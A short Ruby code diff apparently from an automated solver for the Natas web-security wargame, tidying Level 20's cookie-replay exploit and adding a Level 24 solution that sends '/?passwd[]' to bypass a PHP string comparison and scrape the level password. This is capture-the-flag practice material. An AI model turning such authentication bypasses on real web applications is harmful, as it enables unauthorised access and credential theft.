@@ -622,7 +622,7 @@ class NatasLevel20 < NatasLevelBase
 
   def exec
     response = post(PAGE, {}, { 'name' => PAYLOAD })
-    data = get(PAGE, { 'Cookie' => response["Set-Cookie"] }).body
+    data = get(PAGE, { 'Cookie' => response['Set-Cookie'] }).body
     match = %r(Password: (\w{32})</pre>).match(data)
     not_found unless match
     found(match[1])
@@ -687,4 +687,17 @@ end
 # Level 24
 class NatasLevel24 < NatasLevelBase
   LEVEL = 24
+  PAGE = '/?passwd[]'
+
+  def exec
+    data = get(PAGE).body
+    match = %r(Password: (\w{32})</pre>).match(data)
+    not_found unless match
+    return found(match[1])
+  end
+end
+
+# Level 25
+class NatasLevel25 < NatasLevelBase
+  LEVEL = 25
 end
